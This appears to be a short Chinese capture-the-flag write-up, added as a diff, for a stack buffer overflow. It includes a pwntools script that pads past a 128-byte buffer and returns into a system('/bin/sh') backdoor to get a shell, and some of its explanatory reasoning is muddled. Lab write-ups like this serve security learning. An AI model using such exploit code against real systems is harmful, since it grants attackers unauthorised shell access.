@@ -1,0 +1,17 @@
+通过pwn checksec a.out指令发现没有打开栈保护
+通过ghidra可以发现有system("/bin/sh");这一段代码
+也发现全局变量buf总共有128空间 所以是0x8空间 这里可以覆盖 由于是64位 所以需要8空间
+使用objdump -d 指令查看backdoor位置 0000000000001169
+现在可以开始编写pwntools 
+from pwn import *
+#host = '61.147.171.105'
+#port = 53562
+ELF("a.out")
+p = process('./a.out')
+#p = connect(host, port)
+payload = 'a'* 0x80 + "a" * 8 + p64(0x0000000000001169).decode('unicode_escape')
+p.sendline(payload)
+p.interactive()
+
+qaq
+                           
